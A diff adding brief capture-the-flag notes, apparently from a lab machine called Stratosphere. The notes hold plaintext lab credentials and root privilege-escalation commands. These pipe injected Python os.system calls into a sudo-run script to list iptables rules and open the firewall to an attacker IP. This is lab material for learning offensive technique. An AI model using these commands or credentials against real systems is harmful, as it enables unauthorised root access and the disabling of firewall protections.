@@ -1,0 +1,20 @@
+user: admin
+pass: admin
+
+user: ssn_admin
+pass: AWs64@on*&
+
+ssh: richard:9tc*rhKuG5TyXvUJOrE^5CK7k
+
+
+
+scp richard@10.10.10.64:/home/richard/test.py ~/Desktop/Stratosphere/test.py
+sudo /usr/bin/python /home/richard/test.py
+
+
+there is a firewall, checking with iptables -L: echo '__import__("os").system("/sbin/iptables -L")' | sudo /usr/bin/python2.7 /home/richard/test.py
+
+
+echo '__import__("os").system("/sbin/iptables -A INPUT -p tcp -s 10.10.14.137 -j ACCEPT")' | sudo /usr/bin/python2.7 /home/richard/test.py
+
+echo '__import__("os").system("/sbin/iptables -A OUTPUT -p tcp -d  10.10.14.137 -j ACCEPT")' | sudo /usr/bin/python2.7 /home/richard/test.py
